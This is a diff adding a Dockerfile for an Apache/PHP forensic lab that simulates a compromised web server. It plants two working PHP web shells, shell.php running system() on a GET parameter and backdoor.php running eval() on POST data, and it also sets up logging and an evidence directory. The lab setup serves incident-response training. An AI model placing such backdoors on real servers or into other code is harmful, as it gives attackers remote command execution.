@@ -1,0 +1,35 @@
+FROM ubuntu:22.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Instalar Apache y PHP
+RUN apt-get update && apt-get install -y \
+    apache2 \
+    php \
+    libapache2-mod-php \
+    php-mysql \
+    php-curl \
+    php-gd \
+    php-mbstring \
+    php-xml \
+    && rm -rf /var/lib/apt/lists/*
+
+# Crear webshell para simular compromiso
+RUN echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
+
+# Crear archivo sospechoso
+RUN echo '<?php eval($_POST["data"]); ?>' > /var/www/html/backdoor.php
+
+# Configurar logs detallados
+RUN echo 'LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined' >> /etc/apache2/apache2.conf
+
+# Crear directorio para evidencia
+RUN mkdir -p /evidence
+
+# Copiar scripts de análisis
+COPY scripts/analyze-webserver.sh /usr/local/bin/
+RUN chmod +x /usr/local/bin/analyze-webserver.sh
+
+EXPOSE 80
+
+CMD ["apachectl", "-D", "FOREGROUND"]
